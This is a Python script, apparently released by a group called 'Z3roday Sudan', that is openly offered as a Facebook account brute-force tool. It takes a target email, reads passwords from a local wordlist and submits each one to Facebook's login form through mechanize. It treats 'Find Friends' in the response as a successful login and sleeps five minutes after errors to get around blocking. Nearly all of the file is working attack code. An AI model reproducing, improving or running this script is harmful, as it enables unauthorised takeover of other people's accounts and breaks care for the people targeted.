#!/usr/bin/env python
# -*- coding:utf-8 -*-
import sys
import time
import hashlib, bcrypt
import random
import requests
import threading
from bs4 import BeautifulSoup
import os




# colour
G = "\033[35m"; O = "\033[36m"; B = "\033[37m"; R = "\033[38m"; W = "\033[0m"; P = "\033[39m";

print O+("")
mess = """
        ____                _                             _
     |___ \              | |                           | |
  ____ __) |_ __ ___   __| | __ _ _   _   ___ _   _  __| | __ _ _ __
 |_  /|__ <| '__/ _ \ / _` |/ _` | | | | / __| | | |/ _` |/ _` | '_ \
  / / ___) | | | (_) | (_| | (_| | |_| | \__ \ |_| | (_| | (_| | | | |
 /___|____/|_|  \___/ \__,_|\__,_|\__, | |___/\__,_|\__,_|\__,_|_| |_|
                                   __/ |
                                  |___/
                                                         """

print mess
print "                          create  Z3roday Sudan"
print "                         script facebook BruteForc "
print "  Note :▂▃▄▅▆▇█▓▒░Now you can brutforce attack account fb ░▒▓█▇▆▅▄▃▂"



def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.3)
mengetik('&_<︻╦̵̵͇̿̿̿̿ vist our site ╤───.......┣▇ https://zeroday-sudan.ml  ▇▇▇▇▇═─  \n\n')

def render(size, position):
    return "[" + (" " * position) + " coded Z3roday-sudan  " + (" " * (size - position - 1)) + "]"

def draw(size, iterations, channel=sys.stdout, waittime=0.2):
    for index in range(iterations):
        n = index % (size*2)
        position = (n if n < size else size*2 - n - 1)
        bar = render(size, position)
        channel.write(bar + '\r')
        channel.flush()
        time.sleep(waittime)

if __name__ == '__main__':
    draw(6, 100, channel=sys.stdout)




os.system("clear")

post_url='https://www.facebook.com/login.php'
headers = {
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}

try:
	import mechanize
	import urllib2
	browser = mechanize.Browser()
	browser.addheaders = [('User-Agent',headers['User-Agent'])]
	browser.set_handle_robots(False)
except:
	print('\n\tPlease install mechanize.\n')
	sys.exit()

print('\n---------- Welcome To FB BruteForc by TEAM-SUDAN ----------\n')
file=open('passwords.txt','r')

email=str(raw_input('Enter Email/Username : ').strip())

print "\nTarget Email ID : ",email
print "\nTrying Passwords from list ..."

i=0
while file:
	passw=file.readline().strip()
	i+=1
	print str(i) +" : ",passw
	response = browser.open(post_url)
	try:
		if response.code == 200:
			browser.select_form(nr=0)
			browser.form['email'] = email
			browser.form['pass'] = passw
			response = browser.submit()
			if 'Find Friends' in response.read():
				print('Your password is : ',passw)
				break
	except:
		print('\nSleeping for time : 5 min\n')
		time.sleep(300)
